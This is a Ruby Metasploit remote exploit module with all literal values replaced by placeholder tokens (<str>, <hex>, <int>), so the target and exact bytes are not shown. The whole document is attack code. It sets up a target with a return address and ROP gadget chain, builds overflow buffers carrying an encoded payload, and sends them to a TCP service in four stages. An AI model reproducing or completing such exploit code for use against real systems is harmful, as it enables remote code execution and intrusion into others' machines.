require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = AverageRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> ] , <str> = > ARCH_X86 , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > true , <str> = > <str> , <str> = > { <str> = > <hex> , <str> = > <str> , <str> = > true , } , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <int> , <str> = > [ <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <int> , <hex> , <hex> , <hex> , <hex> , <int> , <hex> , <hex> , <str> . unpack ( <str> ) . first , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> - <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , ] } ] ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) , ] , self . class ) end def exploit connect triggerA = <str> + <str> * <int> + <str> + <str> triggerB = <str> + <str> + <str> + <str> triggerC = <str> + <str> + <str> + <str> + payload . encoded + <str> * ( target [ <str> ] - payload . encoded . length ) + [ target . ret ] . pack ( <str> ) new = <str> if target [ <str> ] new << target [ <str> ] . map { | e | if e == <hex> rand_text ( <int> ) . unpack ( <str> ) . first else e end } . pack ( <str> ) end triggerC << new triggerC << <str> * <int> triggerC << <str> triggerC << <str> triggerD = <str> + <str> + <str> + <str> print_status ( <str> ) sock . put ( triggerA ) select ( nil , nil , nil , <int> ) print_status ( <str> ) sock . put ( triggerB ) select ( nil , nil , nil , <int> ) print_status ( <str> ) sock . put ( triggerC ) select ( nil , nil , nil , <int> ) print_status ( <str> ) sock . put ( triggerD ) select ( nil , nil , nil , <int> ) disconnect end end 
